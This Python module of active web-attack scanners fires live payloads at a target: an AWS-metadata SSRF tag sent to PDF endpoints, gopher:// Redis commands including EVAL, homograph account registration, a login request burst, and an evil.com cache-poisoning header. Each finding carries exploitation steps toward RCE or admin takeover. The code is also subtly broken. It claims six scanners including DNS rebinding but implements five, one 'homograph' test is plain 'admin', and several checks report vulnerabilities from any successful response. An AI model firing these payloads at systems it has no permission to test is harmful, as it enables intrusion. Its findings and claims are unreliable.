"""
Advanced Attack Scanners - Compact Bundle
==========================================
PDF SSRF, Unicode Normalization, Redis Injection, DNS Rebinding, Rate Limiting, Cache Poisoning

Bundled for efficiency - 6 niche scanners in one file.
"""
from __future__ import annotations
import asyncio, hashlib, logging, re, time
from dataclasses import dataclass, field
from typing import List, Optional, Dict, Any
from urllib.parse import quote
import httpx

log = logging.getLogger("oneinfinity.advanced_attacks")

# ── Traffic Capture Helper ───────────────────────────────────────────────────
def _capture_traffic(method: str, url: str, payload: str, resp: httpx.Response, finding_id: str, attack_type: str):
    """Persist attack traffic to database."""
    try:
        from oneinfinity.scan.traffic_capture_engine import traffic_capture_engine

        traffic_capture_engine.capture(
            method=method,
            url=url,
            headers=dict(resp.request.headers) if resp.request else {},
            body=payload,
            response_status=resp.status_code,
            response_headers=dict(resp.headers),
            response_body=resp.text[:10000],  # Limit body size
            source="advanced_scanners",
            duration_ms=int(resp.elapsed.total_seconds() * 1000) if resp.elapsed else 0,
            tags=["advanced_attack", attack_type],
            vuln_id=finding_id,
            attack_type=attack_type,
        )
    except Exception as e:
        log.debug(f"Failed to capture traffic: {e}")

@dataclass
class AdvancedFinding:
    finding_id: str
    vuln_type: str
    title: str = ""
    severity: str = "high"
    url: str = ""
    attack_type: str = ""
    payload: str = ""
    evidence: str = ""
    confidence: float = 0.0
    exploitation_steps: List[str] = field(default_factory=list)
    tool: str = "advanced_scanner"
    source_type: str = "active"
    def to_dict(self) -> dict:
        return {k: v for k, v in self.__dict__.items()}

# ── PDF Generation SSRF ──────────────────────────────────────────────────────
async def scan_pdf_generation_ssrf(target: str) -> List[AdvancedFinding]:
    """Detect HTML-to-PDF endpoints and test SSRF."""
    findings = []
    async with httpx.AsyncClient(timeout=10, verify=False) as client:
        # Detect PDF generation endpoints
        pdf_indicators = ["/pdf", "/export", "/print", "/generate", "/report"]
        for path in pdf_indicators:
            test_url = f"{target}{path}"
            try:
                # Test with SSRF payload in HTML
                ssrf_payload = '<img src="http://169.254.169.254/latest/meta-data/">'
                resp = await client.post(test_url, data={"html": ssrf_payload, "content": ssrf_payload})
                if resp.status_code == 200 and "pdf" in resp.headers.get("content-type", "").lower():
                    finding_id = hashlib.md5(f"pdf_ssrf_{test_url}".encode()).hexdigest()[:16]

                    # Capture attack traffic
                    _capture_traffic("POST", test_url, ssrf_payload, resp, finding_id, "pdf_ssrf")

                    findings.append(AdvancedFinding(
                        finding_id=finding_id,
                        vuln_type="pdf_generation_ssrf",
                        title=f"PDF generation SSRF on {test_url}",
                        severity="critical",
                        url=test_url,
                        attack_type="pdf_ssrf",
                        payload=ssrf_payload,
                        evidence="PDF endpoint accepts HTML with external resources",
                        confidence=0.80,
                        exploitation_steps=[
                            "1. PDF generator (WeasyPrint/wkhtmltopdf) fetches URLs",
                            "2. Inject <img> tag with internal URL",
                            "3. Access AWS metadata or internal services",
                            "4. Exfiltrate via PDF response or timing",
                        ]
                    ))
            except Exception:
                continue
    return findings

# ── Unicode Normalization ────────────────────────────────────────────────────
async def scan_unicode_normalization(target: str) -> List[AdvancedFinding]:
    """Test Unicode normalization collisions for auth bypass."""
    findings = []
    async with httpx.AsyncClient(timeout=10, verify=False) as client:
        # Test username collision: admin vs аdmin (Cyrillic 'a')
        test_cases = [
            ("admin", "аdmin"),  # Cyrillic а
            ("admin", "admin"),  # Latin a  
            ("admin", "𝐚dmin"),  # Mathematical bold
        ]
        for normal, homograph in test_cases:
            try:
                # Test registration with homograph
                resp = await client.post(f"{target}/register", data={"username": homograph, "password": "test123"})
                if resp.status_code in [200, 201]:
                    finding_id = hashlib.md5(f"unicode_{target}".encode()).hexdigest()[:16]

                    # Capture attack traffic
                    _capture_traffic("POST", f"{target}/register", homograph, resp, finding_id, "unicode_norm")

                    findings.append(AdvancedFinding(
                        finding_id=finding_id,
                        vuln_type="unicode_normalization",
                        title=f"Unicode normalization bypass on {target}",
                        severity="high",
                        url=f"{target}/register",
                        attack_type="unicode_norm",
                        payload=homograph,
                        evidence=f"Homograph '{homograph}' accepted (collides with '{normal}')",
                        confidence=0.75,
                        exploitation_steps=[
                            f"1. Register user '{homograph}' (looks like '{normal}')",
                            "2. NFC/NFD normalization creates collision",
                            "3. Bypass authentication checks",
                            "4. Access admin account",
                        ]
                    ))
                    break
            except Exception:
                continue
    return findings

# ── Redis Command Injection ──────────────────────────────────────────────────
async def scan_redis_injection(target: str) -> List[AdvancedFinding]:
    """Test Redis command injection via SSRF."""
    findings = []
    # Redis injection requires SSRF to localhost:6379
    # Test gopher protocol
    redis_payloads = [
        "gopher://127.0.0.1:6379/_INFO",
        "gopher://127.0.0.1:6379/_SET%20test%20value",
        "gopher://127.0.0.1:6379/_EVAL%20'return%20redis.call(%22GET%22,%22*%22)'%200",
    ]
    async with httpx.AsyncClient(timeout=10, verify=False) as client:
        for payload in redis_payloads:
            try:
                resp = await client.get(f"{target}?url={quote(payload)}")
                if "redis_version" in resp.text.lower() or "PONG" in resp.text:
                    finding_id = hashlib.md5(f"redis_{target}".encode()).hexdigest()[:16]

                    # Capture attack traffic
                    _capture_traffic("GET", f"{target}?url={quote(payload)}", payload, resp, finding_id, "redis_injection")

                    findings.append(AdvancedFinding(
                        finding_id=finding_id,
                        vuln_type="redis_injection",
                        title=f"Redis command injection on {target}",
                        severity="critical",
                        url=target,
                        attack_type="redis_cmd",
                        payload=payload,
                        evidence="Redis command executed via SSRF",
                        confidence=0.90,
                        exploitation_steps=[
                            "1. SSRF to localhost:6379 (Redis)",
                            "2. Use gopher:// protocol",
                            "3. Execute EVAL/SET/MODULE LOAD commands",
                            "4. Achieve RCE via .so module load",
                        ]
                    ))
                    break
            except Exception:
                continue
    return findings

# ── Rate Limiting ────────────────────────────────────────────────────────────
async def scan_rate_limiting(target: str) -> List[AdvancedFinding]:
    """Test for missing rate limiting."""
    findings = []
    async with httpx.AsyncClient(timeout=5, verify=False) as client:
        # Test rapid requests
        try:
            start = time.time()
            tasks = [client.get(f"{target}/login") for _ in range(20)]
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            elapsed = time.time() - start
            
            success_count = sum(1 for r in responses if isinstance(r, httpx.Response) and r.status_code == 200)
            if success_count == 20 and elapsed < 2:
                finding_id = hashlib.md5(f"rate_{target}".encode()).hexdigest()[:16]

                # Capture sample traffic (first successful response)
                sample_resp = next((r for r in responses if isinstance(r, httpx.Response) and r.status_code == 200), None)
                if sample_resp:
                    _capture_traffic("GET", f"{target}/login", "20 rapid requests", sample_resp, finding_id, "rate_limit")

                findings.append(AdvancedFinding(
                    finding_id=finding_id,
                    vuln_type="no_rate_limiting",
                    title=f"No rate limiting on {target}",
                    severity="medium",
                    url=f"{target}/login",
                    attack_type="rate_limit",
                    payload="20 requests in <2s",
                    evidence=f"{success_count}/20 requests succeeded in {elapsed:.2f}s",
                    confidence=0.85,
                    exploitation_steps=[
                        "1. No rate limiting on sensitive endpoint",
                        "2. Credential stuffing possible",
                        "3. Brute-force attacks feasible",
                    ]
                ))
        except Exception:
            pass
    return findings

# ── Cache Poisoning ──────────────────────────────────────────────────────────
async def scan_cache_poisoning(target: str) -> List[AdvancedFinding]:
    """Test cache poisoning via unkeyed headers."""
    findings = []
    async with httpx.AsyncClient(timeout=10, verify=False) as client:
        # Test X-Forwarded-Host poisoning
        evil_host = "evil.com"
        try:
            resp1 = await client.get(target, headers={"X-Forwarded-Host": evil_host})
            if evil_host in resp1.text:
                # Check if cached
                resp2 = await client.get(target)
                if evil_host in resp2.text:
                    finding_id = hashlib.md5(f"cache_{target}".encode()).hexdigest()[:16]

                    # Capture poisoned request
                    _capture_traffic("GET", target, f"X-Forwarded-Host: {evil_host}", resp1, finding_id, "cache_poison")

                    findings.append(AdvancedFinding(
                        finding_id=finding_id,
                        vuln_type="cache_poisoning",
                        title=f"Cache poisoning on {target}",
                        severity="high",
                        url=target,
                        attack_type="cache_poison",
                        payload=f"X-Forwarded-Host: {evil_host}",
                        evidence="Poisoned cache serves evil host to all users",
                        confidence=0.85,
                        exploitation_steps=[
                            "1. Send request with X-Forwarded-Host: evil.com",
                            "2. Response includes evil.com in links",
                            "3. Cache stores poisoned response",
                            "4. All users receive poisoned content",
                        ]
                    ))
        except Exception:
            pass
    return findings

# ── Orchestrator ─────────────────────────────────────────────────────────────
async def scan_all_advanced(target: str) -> Dict[str, List[AdvancedFinding]]:
    """Run all 6 advanced scanners in parallel."""
    log.info(f"Starting advanced attack scans for {target}")
    
    tasks = {
        "pdf_ssrf": scan_pdf_generation_ssrf(target),
        "unicode_norm": scan_unicode_normalization(target),
        "redis_injection": scan_redis_injection(target),
        "rate_limiting": scan_rate_limiting(target),
        "cache_poisoning": scan_cache_poisoning(target),
    }
    
    results = await asyncio.gather(*tasks.values(), return_exceptions=True)
    
    findings_dict = {}
    for (scan_name, _), result in zip(tasks.items(), results):
        if isinstance(result, list):
            findings_dict[scan_name] = result
        else:
            findings_dict[scan_name] = []
            log.debug(f"{scan_name} failed: {result}")
    
    total = sum(len(f) for f in findings_dict.values())
    log.info(f"Advanced scans complete: {total} findings")
    return findings_dict
